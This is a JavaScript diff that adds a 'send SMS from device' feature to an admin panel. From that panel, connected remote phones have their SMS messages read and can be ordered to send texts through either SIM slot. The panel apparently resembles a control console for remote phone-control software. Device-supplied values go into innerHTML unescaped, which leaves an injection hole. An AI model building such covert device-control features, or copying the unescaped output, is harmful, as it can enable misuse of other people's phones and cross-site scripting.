@@ -218,6 +218,28 @@ function connectWebSocket() {
   socket.on('device_status_update', d => {
     if (currentPage === 'connections') upsertDeviceCard(d);
   });
+
+  // SMS send result from device
+  socket.on('sms_send_result', d => {
+    const statusEl = document.getElementById('smsSendStatus');
+    if (d.success) {
+      statusEl.className = 'sms-send-status success';
+      statusEl.innerHTML = `<i class="ri-checkbox-circle-line"></i> SMS sent successfully to ${d.receiver || 'recipient'} via SIM ${d.sim_slot || '?'}`;
+      statusEl.classList.remove('hidden');
+      addActivity('ri-send-plane-2-fill', `SMS sent to ${d.receiver || '?'} via SIM ${d.sim_slot || '?'}`);
+      showToast('SMS sent successfully!', 'success');
+      // Clear compose fields
+      document.getElementById('smsReceiver').value = '';
+      document.getElementById('smsMessage').value = '';
+    } else {
+      statusEl.className = 'sms-send-status error';
+      statusEl.innerHTML = `<i class="ri-error-warning-line"></i> Device failed to send: ${d.error || 'Unknown error'}`;
+      statusEl.classList.remove('hidden');
+      showToast('Device failed to send SMS: ' + (d.error || 'Unknown error'), 'error');
+    }
+    // Auto-hide after 6 seconds
+    setTimeout(() => statusEl.classList.add('hidden'), 6000);
+  });
 }
 
 function setWsStatus(state, label) {
@@ -675,6 +697,9 @@ async function openSmsModal(deviceId, deviceName) {
   document.getElementById('smsModalTitle').textContent = `SMS — ${deviceName}`;
   document.getElementById('smsModalSub').textContent = 'Loading messages...';
   document.getElementById('smsSearch').value = '';
+  document.getElementById('smsReceiver').value = '';
+  document.getElementById('smsMessage').value = '';
+  document.getElementById('smsSendStatus').classList.add('hidden');
   document.getElementById('smsListContainer').innerHTML = `<div class="sms-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading messages...</span></div>`;
   document.getElementById('smsPagination').innerHTML = '';
   document.getElementById('smsModal').classList.remove('hidden');
@@ -783,6 +808,65 @@ function filterSmsMessages() {
   renderSmsMessages(filtered);
 }
 window.filterSmsMessages = filterSmsMessages;
+
+// ========== Send SMS from Device ==========
+async function sendSmsFromDevice(simSlot) {
+  const receiver = document.getElementById('smsReceiver').value.trim();
+  const message = document.getElementById('smsMessage').value.trim();
+
+  if (!receiver) return showToast('Enter a receiver phone number', 'error');
+  if (!message) return showToast('Enter a message to send', 'error');
+  if (!smsDeviceId) return showToast('No device selected', 'error');
+
+  // Disable buttons while sending
+  const btn1 = document.getElementById('smsSim1Btn');
+  const btn2 = document.getElementById('smsSim2Btn');
+  btn1.disabled = true;
+  btn2.disabled = true;
+
+  const statusEl = document.getElementById('smsSendStatus');
+  statusEl.className = 'sms-send-status sending';
+  statusEl.innerHTML = `<i class="ri-loader-4-line ri-spin"></i> Sending via SIM ${simSlot}...`;
+  statusEl.classList.remove('hidden');
+
+  try {
+    const res = await fetch(`${API_BASE}/api/admin/send-sms`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        password: adminPassword,
+        device_id: smsDeviceId,
+        receiver,
+        message,
+        sim_slot: simSlot,
+      }),
+    });
+
+    const data = await res.json();
+    if (res.ok && data.success) {
+      statusEl.className = 'sms-send-status success';
+      statusEl.innerHTML = `<i class="ri-checkbox-circle-line"></i> Command sent! Waiting for device to send SMS...`;
+      showToast('Send command dispatched to device', 'success');
+    } else {
+      statusEl.className = 'sms-send-status error';
+      statusEl.innerHTML = `<i class="ri-error-warning-line"></i> ${data.error || 'Failed to send command'}`;
+      showToast(data.error || 'Failed to send SMS', 'error');
+    }
+  } catch (err) {
+    statusEl.className = 'sms-send-status error';
+    statusEl.innerHTML = `<i class="ri-error-warning-line"></i> Network error: ${err.message}`;
+    showToast('Network error: ' + err.message, 'error');
+  } finally {
+    btn1.disabled = false;
+    btn2.disabled = false;
+
+    // Auto-hide status after 5 seconds
+    setTimeout(() => {
+      statusEl.classList.add('hidden');
+    }, 5000);
+  }
+}
+window.sendSmsFromDevice = sendSmsFromDevice;
 
 // ========== Settings ==========
 async function saveSettings() {
